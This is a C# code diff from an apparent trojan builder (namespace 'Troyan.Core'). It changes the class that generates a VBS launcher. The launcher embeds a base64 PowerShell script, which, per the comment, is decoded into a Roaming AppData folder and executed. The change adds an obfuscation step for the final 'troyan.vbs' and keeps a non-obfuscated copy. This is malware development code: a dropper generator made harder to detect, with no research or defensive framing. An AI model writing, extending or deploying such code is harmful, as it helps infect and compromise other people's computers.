@@ -2,9 +2,13 @@ using Commons;
 
 namespace Troyan.Core;
 
-/// <summary>Writes <c>troyan.vbs</c> with standard base64 of plain <c>body.debug.ps1</c> (decode to the same path as <c>Get-BodyPath</c>: Roaming AppData, sanitized <c>MachineName</c> folder and script basename, then run).</summary>
+/// <summary>Writes <c>nonobfuscated.vbs</c> (raw) then final <c>troyan.vbs</c> via <see cref="ITroyanVbsObfuscator"/> (stub = copy).</summary>
 public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
 {
+    private readonly ITroyanVbsObfuscator _obfuscator;
+
+    public TroyanPlainVbsEmitter(ITroyanVbsObfuscator obfuscator) => _obfuscator = obfuscator;
+
     public void Write(ServerLayoutPaths layout)
     {
         var templatePath = Path.Combine(layout.TroyanVbsDir, "launcher.vbs");
@@ -21,10 +25,14 @@ public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
         if (!template.Contains(placeholder, StringComparison.Ordinal))
             throw new InvalidOperationException("launcher.vbs must contain the 0102 placeholder.");
 
-        var vbs = template.Replace(placeholder, b64, StringComparison.Ordinal);
+        var plain = template.Replace(placeholder, b64, StringComparison.Ordinal);
+        var final = _obfuscator.Obfuscate(plain);
+
         var dir = Path.GetDirectoryName(layout.TroyanOutputVbs);
         if (!string.IsNullOrEmpty(dir))
             Directory.CreateDirectory(dir);
-        File.WriteAllText(layout.TroyanOutputVbs, vbs);
+
+        File.WriteAllText(layout.TroyanOutputVbsNonObfuscated, plain);
+        File.WriteAllText(layout.TroyanOutputVbs, final);
     }
 }
